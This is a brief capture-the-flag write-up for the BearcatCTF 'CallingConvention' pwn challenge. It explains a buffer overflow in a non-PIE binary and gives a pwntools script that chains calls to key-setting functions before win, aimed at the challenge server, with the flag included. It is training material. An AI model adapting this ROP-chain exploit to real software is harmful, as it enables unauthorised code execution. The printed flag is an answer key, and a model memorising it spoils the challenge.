# CallingConvention
Note: We solved this very early and the files might have changed.

To solve this you can read the source code to see the win conditions. We need to call win but before that we need to have certain conditions met:
```c
if (key1 != 27000 && key2 != 0xbadf00d && key3 != 0x1337){
```
To dot hat we can call the functions that set keys because `PIE` is not enabled and we have a buffer overflow. No PIE means we know function address' and buffer overflow allows us to hijack control flow.

Solve script:
```python
from pwn import *

bin = "./calling_convention"
elf = context.binary = ELF(bin)
#p = process(bin)
p = remote('chal.bearcatctf.io', 39440)

offset = 16
payload = b'A'*offset 
#set key3
#set key1
payload += p64(0x000000000040101a) # ret gadget
payload += p64(elf.sym['food']) + p64(elf.sym['set_key1'])
payload += p64(elf.sym['number3']) + p64(elf.sym['ahhhhhhhh']) + p64(elf.sym['win'])
p.sendline(payload)
p.interactive()
#BCCTF{R0p_Ch41ns_1b01c1c3}
```